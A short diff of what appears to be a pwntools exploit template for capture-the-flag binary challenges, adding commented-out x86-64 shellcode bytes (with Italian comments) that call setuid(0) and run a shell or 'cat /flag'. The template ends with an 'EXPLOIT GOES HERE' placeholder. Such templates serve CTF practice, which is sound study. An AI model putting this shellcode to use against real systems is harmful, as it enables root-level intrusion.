@@ -38,6 +38,11 @@ buff_len = int(cyclic_find(io.corefile.fault_addr,n=8))
 io.close()
 # Assuming i want to retrieve the string "test" from the binary:
 # string_addr = next(elf.search(b'test\x00'))
-# function_addr = elf.symbols.function_name # TODO replace function_name with the actual name of the function
+# funct_addr = elf.symbols.function_name
 # shellcode = asm(shellcraft.cat('/flag'))
+# Shellcode alternativo per cat /flag
+# shellcode=b"\x48\x31\xFF\x6A\x69\x58\x0F\x05\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x99\x50\x54\x5F\x52\x66\x68\x2D\x63\x54\x5E\x52\xE8\x0A\x00\x00\x00\x63\x61\x74\x20\x2F\x66\x6C\x61\x67\x00\x56\x57\x54\x5E\x6A\x3B\x58\x0F\x05"
+# Shellcode per /bin/sh con permessi di root (richiede il passaggio ad interactive())
+# shellcode =b"\x48\x31\xFF\x6A\x69\x58\x0F\x05\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x99\x50\x54\x5F\x52\x5E\x6A\x3B\x58\x0F\x05"
+
 #EXPLOIT GOES HERE
